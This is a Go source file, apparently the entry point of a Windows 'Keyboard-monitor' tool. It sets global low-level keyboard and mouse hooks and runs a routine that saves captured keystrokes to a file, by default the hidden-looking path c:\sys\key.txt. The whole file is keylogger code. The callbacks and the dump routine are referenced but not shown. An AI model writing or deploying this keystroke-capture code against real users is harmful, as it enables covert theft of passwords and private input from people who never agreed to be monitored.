package main

import (
	"flag"
	"fmt"
	"github.com/BalconyJH/Keyboard-monitor/listener/win32"
)

// 默认配置
const (
	defaultPath = "c:\\sys\\key.txt" // 默认文件保存路径
)

var (
	kbHook win32.HHOOK
	msHook win32.HHOOK
)

func main() {
	var err error
	path := flag.String("o", defaultPath, "output to file")
	flag.Parse()
	fmt.Println("output to file:", *path)
	kbHook, err := win32.SetWindowsHookEx(win32.WH_KEYBOARD_LL, keyboardCallBack, 0, 0)
	if err != nil {
		panic(err)
	}
	defer func(hhk win32.HHOOK) {
		_, err := win32.UnhookWindowsHookEx(hhk)
		if err != nil {
			panic(err)
		}
	}(kbHook)
	msHook, err := win32.SetWindowsHookEx(win32.WH_MOUSE_LL, mouseCallBack, 0, 0)
	defer func(hhk win32.HHOOK) {
		_, err := win32.UnhookWindowsHookEx(hhk)
		if err != nil {
			panic(err)
		}
	}(msHook)
	go keyDump(*path)
	win32.GetMessage(new(win32.MSG), 0, 0, 0)
}
